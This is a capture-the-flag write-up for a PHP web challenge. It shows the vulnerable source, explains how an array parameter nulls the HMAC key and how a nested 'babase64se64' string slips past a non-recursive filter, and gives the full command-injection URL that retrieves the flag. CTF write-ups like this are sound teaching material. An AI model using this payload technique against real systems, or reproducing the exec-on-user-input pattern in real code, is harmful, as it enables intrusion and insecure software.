# Buggy PHP
**category:** web  
**points:** 469    
**solves:** 29    
**author:** Dungeon_Master

## Description
> IP : http://165.22.179.69/ pass through the php filters to get the flag

## Solution

The code of the challenge is the following:
```php
 <?php
require('req.php');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
show_source("index.php");
if (empty($_GET['hash']) || empty($_GET['cmd']) || empty($_GET['tmp'])){
    exit;
}

$key = getenv('KEY');

if(isset($_GET['tmp']))
    $key = hash_hmac('sha256',$_GET['tmp'],$key);

$hash = hash_hmac('sha256',$_GET['cmd'],$key);

if ($hash !== $_GET['hash']) {
    echo "NO flag for you";
    exit;
}

$cmd = preg_replace($filter, '', $_GET['cmd']);
echo exec("cmd ".$cmd);
?> 
```

The trick here is that **hash_hmac** return NULL when the second argument is an array, 
So you make $_GET['tmp'] to an array so that the $key will be equal to NULL
After that you just need to calculate the hash_hmac of your command with a NULL key like this :
```php
 <?php
$cmd = "||babase64se64 req.*";
$hash = hash_hmac('sha256',$cmd,$key);
echo $hash;
?> 
```
Next the command we need to run is `||babase64se64 req.*` the `||` are to run another command that `cmd` and since base64 is remove with preg_replace we just need to write base64 inside of base64, the one inside the other will be removed and the rest will for base64 since the replace is not reccursive
The command will print the base64 of the req.php file.

here is the final payload : 
```
http://165.22.179.69/?hash=eedbd93eda4d5ff61abdba29c0525ab410c098b4601e1a0f12e6743b84dad07f&tmp[]=&cmd=%7C%7Cbabase64se64%20req.*
```


![](https://i.imgur.com/X8JKfj4.png)

That gives `YjAwdDJyb290e0J1OTl5X3BIcF9DaDRsbDNuOTNzfSc7Cj8+` which base64 decoded is :
```
b00t2root{Bu99y_pHp_Ch4ll3n93s}'; 
?>
```

**Flag : b00t2root{Bu99y_pHp_Ch4ll3n93s}**
